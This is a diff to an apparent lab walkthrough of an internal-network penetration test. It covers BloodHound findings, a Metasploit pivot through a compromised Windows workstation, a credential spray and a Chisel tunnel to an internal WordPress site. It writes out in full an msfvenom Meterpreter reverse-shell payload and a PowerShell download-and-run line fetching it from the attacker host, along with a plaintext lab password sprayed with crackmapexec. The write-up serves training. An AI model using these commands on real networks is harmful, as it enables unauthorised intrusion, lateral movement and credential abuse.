@@ -504,7 +504,7 @@ The attacker will also use the predefined query to find Kerberoastable Users:
 
 <figure><img src="../.gitbook/assets/AtP-BH_AllKerberoastable.png" alt=""><figcaption><p>Kerberoastable Users</p></figcaption></figure>
 
-This reveals that the users `daniela` and `krbtgt` are Kerberoastable. `krbtgt` is not worth bothering as the hash will likely be uncrackable. But `daniela` could be interesting.
+This reveals that the users `daniela` and `krbtgt` are Kerberoastable. `krbtgt` is not worth bothering as the hash will likely be uncrackable. But `daniela` could be crackable.
 
 #### Service Principal Names
 
@@ -518,8 +518,314 @@ MATCH (n:User)WHERE n.hasspn=true RETURN n
 
 <figure><img src="../.gitbook/assets/AtP-BH_DanielaSPN.png" alt=""><figcaption><p>SPN for daniela</p></figcaption></figure>
 
-The structure of the SPN indicates that there is an internal web application (`http`) hosted on `INTERNALSRV1`.
+The structure of the SPN indicates that there is an internal web application (`http`) hosted on `INTERNALSRV1`.&#x20;
+
+Also because the user is daniela and the account was determined to be Kerberoastable, perhaps if her password is cracked it can be used to access `INTERNALSRV1`.
+
+While this is interesting it is good policy to not let finding an actionable vector interrupt enumeration. Therefore this information is written down but then enumeration continues.
 
 #### Conclusion
 
 This concludes the domain enumeration from `CLIENTWK1`. The attacker could have used [PowerView](../windows/active-directory/enumeration/manual.md#powerview), [Enumerate-AD](../windows/active-directory/enumeration/manual.md#enumerate-a-d), or [LDAP queries](../windows/active-directory/enumeration/manual.md#powershell) to obtain most of this information. However, in most penetration tests, it is preferable to use BloodHound first as the output of the other methods can be quite overwhelming. It's an effective and powerful tool to gain a deeper understanding of the Active Directory environment in a short amount of time. One can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view.
+
+## Internal Network Enumeration
+
+The next step would be to enumerate the internal network; especially `INTERNALSRV1` which is thought to be hosting a web application. In order to do this the attacker will need to proxy their traffic through CLIENTWK1.
+
+### Establishing a Port Forward
+
+#### Launching Meterpreter
+
+The attacker will use Metasploit to set up a dynamic [port forward](../attack-vectors/exploit-frameworks/metasploit/post-exploitation/port-forwarding.md). It will leverage the [`autoroute`](../attack-vectors/exploit-frameworks/metasploit/post-exploitation/port-forwarding.md#autoroute) and [`socks_proxy`](../attack-vectors/exploit-frameworks/metasploit/post-exploitation/port-forwarding.md#socks-proxy) modules.
+
+First the attacker should create a generic Windows Meterpreter Reverse Shell via `msfvenom`:
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.243 LPORT=443 --platform windows -a x64 -e x64/xor -f exe -o met.exe
+```
+{% endcode %}
+
+This should be saved as it will probably be needed again. The listener can then be configured and launched in `msfconsole` with the command:
+
+{% code overflow="wrap" %}
+```bash
+msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.45.243;set LPORT 443;set ExitOnSession false;run -j -q"
+```
+{% endcode %}
+
+The attacker can then use their reverse shell session to transfer `met.exe` to `CLIENTWK1` and execute it:
+
+```powershell
+iwr -uri http://192.168.45.243/tmp/met.exe -o .\met.exe; .\met.exe
+```
+
+Once run on the victim, a Meterpreter [session](../attack-vectors/exploit-frameworks/metasploit/modules/#sessions) is created on the attacker's machine:
+
+```
+msf6 exploit(multi/handler) > [*] Meterpreter session 1 opened (192.168.45.243:443 -> 192.168.228.242:63900) at 2024-04-17 18:45:18 -0600
+
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1  192.168.45.243:443 -> 192.168.228.242:63900 (172.16.184.243)
+```
+
+#### Autoroute
+
+Now that a session has been created the attacker can use the [`autoroute`](../attack-vectors/exploit-frameworks/metasploit/post-exploitation/port-forwarding.md#autoroute) module to begin the creation of a SOCKS Proxy. The commands are listed one-per-block for easier copy/pasting:
+
+```
+use multi/manage/autoroute
+```
+
+```
+set session 1
+```
+
+* Session ID is based on the ID from the [previous step](pivoting-to-the-internal-network.md#launching-meterpreter) (`1` in this example)
+
+The module is the `run`. All together this looks like:
+
+```shell-session
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+session => 1
+msf6 post(multi/manage/autoroute) > run
+
+[*] Running module against CLIENTWK1
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.184.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+```
+
+#### SOCKS Proxy
+
+The SOCKS Proxy is then created with the socks\_proxy module. Again the commands are listed one-per-block for easier copy/pasting:
+
+```
+use auxiliary/server/socks_proxy
+```
+
+```
+set SRVHOST 127.0.0.1
+```
+
+```
+set VERSION 5
+```
+
+```
+run -j -q
+```
+
+All together it looks like:
+
+```
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set VERSION 5
+VERSION => 5
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 1.
+```
+
+The proxy is created and can be seen listening at `127.0.0.1:1080`:
+
+```shell-session
+kali@kali:~/beyond$ netstat -tnpl             
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      138250/ruby
+...
+```
+
+### Using the Forward
+
+[Proxychains](../attack-vectors/port-forwarding-and-tunneling/ssh-tunneling/ssh-dynamic-port-forwarding.md#proxychains) will be used to send traffic through the tunnel.
+
+#### Configuring Proxychains
+
+Recall the Proxychains configuration file resides at `/etc/proxychains4.conf`. In order to work for this application the last line of the configuration file must be:
+
+```
+socks5  127.0.0.1 1080
+```
+
+```shell-session
+kali@kali:~/beyond$ tail -n 1 /etc/proxychains4.conf
+socks5  127.0.0.1 1080
+```
+
+### Credential Spray Via Proxychains
+
+Recall that commands must just be prepended with `proxychains` to send traffic over the proxy. This example will combine `crackmapexec` with `proxychains`. In this instance the `john` credentials are being sprayed:
+
+{% code overflow="wrap" %}
+```bash
+proxychains -q crackmapexec smb 172.16.184.240-241 172.16.184.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/AtP-Proxychains_CrackmapExec.png" alt=""><figcaption><p>Command output</p></figcaption></figure>
+
+Unfortunately the output shows that `john` doesn't have actionable or interesting permissions on any of the discovered shares. As previously established via a pre-built BloodHound query and now through the scan, `john` as a normal domain user doesn't have local Administrator privileges on any of the machines in the domain.
+
+The output also states that `MAILSRV1` and `INTERNALSRV1` have `SMB signing` set to `False`. Without this security mechanism enabled, one could potentially perform relay attacks if they can force an authentication request.
+
+### Nmap via Proxychains
+
+Next nmap will be used to scan `MAILSRV1`, `DCSRV1`, and `INTERNALSRV1`. for an open FTP, HTTP, or HTTPS port. Nmap's TCP connect scan (`-sT`) _must be used_ when working with Proxychains. The scan will be started with the command:
+
+{% code overflow="wrap" %}
+```bash
+sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.184.240 172.16.184.241 172.16.184.254
+```
+{% endcode %}
+
+The output reveals INTERNALSRV1 (`172.16.X.241`) is hosting something on HTTP/S at ports 80 and 443:
+
+{% code title="nmap_servers" %}
+```
+Nmap scan report for 172.16.177.240
+Host is up (2.3s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  closed http
+443/tcp closed https
+
+Nmap scan report for 172.16.177.241
+Host is up (0.13s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp open   https
+
+Nmap scan report for 172.16.177.254
+Host is up (2.1s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp closed https
+```
+{% endcode %}
+
+Presumably this is some sort of internal web application.
+
+## Examining the Internal Web Application
+
+As discovered a moment ago, INTERNALSRV1 is hosting some sort of internal web application. The attacker will now want to navigate to it via their browser. In order to do this, [Chisel](../attack-vectors/port-forwarding-and-tunneling/tunneling-through-dpi/http-tunneling/chisel.md) will be used at it provides a nice stable browser session.
+
+### Setting Up Chisel
+
+#### Chisel Server
+
+The Chisel server will be hosted on the attacker's Kali machine allowing connections back to the machine. First Windows and Linux binaries must be downloaded from the [releases](https://github.com/jpillora/chisel/releases) page. Note that not all release versions contain Windows binaries. As of writing `1.9.0` contains the most current version of `chisel` for Windows.
+
+The Linux Chisel server is started with the command:
+
+```bash
+./chisel server -p 8080 --reverse
+```
+
+* `server` puts it in server mode
+* `-p 8080` specifies the listening port
+* `--reverse` configures it to accept incoming (reverse) connections
+
+#### Chisel Client
+
+Once the Windows binary is downloaded it must be decompressed and renamed:
+
+```shell-session
+kali@kali:~/Downloads$ gunzip chisel_1.9.0_windows_amd64.gz
+
+kali@kali:~/Downloads$ ls
+chisel_1.9.0_windows_amd64
+
+kali@kali:~/Downloads$ mv ./chisel_1.9.0_windows_amd64 ../beyond/chisel_x64.exe
+```
+
+Then the attacker can move into their Meterpreter session and upload the file with the command:
+
+```
+upload chisel.exe C:\\Users\\marcus\\chisel.exe
+```
+
+```
+meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
+[*] Uploading  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
+[*] Uploaded 7.85 MiB of 7.85 MiB (100.0%): /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
+[*] Completed  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
+```
+
+Then the attacker drops into a `shell` and starts Chisel with the command:
+
+```
+chisel.exe client 192.168.45.243:8080 R:80:172.16.177.241:80
+```
+
+* `192.168.45.243:8080` is the Chisel server configured in the [last step](pivoting-to-the-internal-network.md#chisel-server)
+* `R:80:172.16.177.241:80` establishes a reverse (`R`) port forward from port 80 (first `80`) on the chisel server (attacker's Kali box) to the address `172.16.177.241:80` which is the address of the internal web application
+
+All together:
+
+```
+meterpreter > shell
+Process 5960 created.
+Channel 21 created.
+Microsoft Windows [Version 10.0.22000.978]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\marcus>chisel.exe client 192.168.45.243:8080 R:80:172.16.177.241:80
+chisel.exe client 192.168.45.243:8080 R:80:172.16.177.241:80
+2024/04/18 16:32:48 client: Connecting to ws://192.168.45.243:8080
+2024/04/18 16:32:49 client: Connected (Latency 62.9649ms)
+```
+
+Once this is run the attacker can simply navigate to `http://127.0.0.1` their machine to view the web application on `INTERNALSRV1`:
+
+<figure><img src="../.gitbook/assets/AtP-InternalWebApp_Homescreen.png" alt=""><figcaption><p>Internal web application</p></figcaption></figure>
+
+### Using Chisel
+
+The attacker can now use the web application through their own browser. The main issue is that any redirects can cause issues. For example consider what happens if the attacker attempts to navigate to the WordPress admin page which is usually located at `/wp-admin` (in this instance the full URL would be `http://127.0.0.1/wordpress/wp-admin`):
+
+<figure><img src="../.gitbook/assets/AtP-InternalWebApp_RedirectFailure.png" alt=""><figcaption><p>Admin page fails to load</p></figcaption></figure>
+
+The admin page does not load, but upon examining the error message it seems that the admin page redirected to `internalsrv.beyond.com`. The attacker can assume that the WordPress instance has the DNS name set as this address instead of the IP address. Because the attacker's machine cannot resolve that query it fails to load. A simple path around this issue is to just add `internalsrv1.beyond.com` to the `/etc/hosts` file:
+
+{% code title="/etc/hosts" %}
+```
+...
+# FOR USE WITH CHISEL ONLY - REMOVE AFTER USE
+127.0.0.1    internalsrv1.beyond.com
+```
+{% endcode %}
+
+With these changes it is now possible to navigate to `http://internalsrv1.beyond.com` (which redirects to the home page at `http://internalsrv1.beyond.com/wordpress/`). From here it is possible to navigate to the `/wp-admin` page using the URL below:
+
+```
+http://internalsrv1.beyond.com/wordpress/wp-admin
+```
+
+The redirects take the attacker to the admin page:
+
+<figure><img src="../.gitbook/assets/AtP-InternalWebApp_AdminLoginPortal.png" alt=""><figcaption><p>The admin portal</p></figcaption></figure>
+
+The attacker can try some login attempts such as known credentials and common passwords, `admin:admin`, `root:root`, that kind of thing. Unfortunately none of these work.
+
+## Summary
+
+The attacker has found a lot of useful information in this section. They enumerated all active sessions and found the domain administrator `beccy` has an active session on `MAILSRV1`. Next, they identified `daniela` as a kerberoastable user due to the `http/internalsrv1.beyond.com` SPN.
+
+They then set up a SOCKS5 proxy with [Metasploit](../attack-vectors/exploit-frameworks/metasploit/post-exploitation/port-forwarding.md) and used [CrackMapExec](../windows/active-directory/authentication/attacking-ad-authentication/password-attacks.md#crackmapexec) and [Nmap](../networking-tools/nmap/) to perform network enumeration via [Proxychains](../attack-vectors/port-forwarding-and-tunneling/ssh-tunneling/ssh-dynamic-port-forwarding.md#proxychains). The output revealed that `MAILSRV1` and `INTERNALSRV1` each have an accessible web server and SMB signing disabled. Via [Chisel](../attack-vectors/port-forwarding-and-tunneling/tunneling-through-dpi/http-tunneling/chisel.md), they were able to browse to the WordPress instance on `INTERNALSRV1`. However, none of the credentials worked to log in to the WordPress login page.
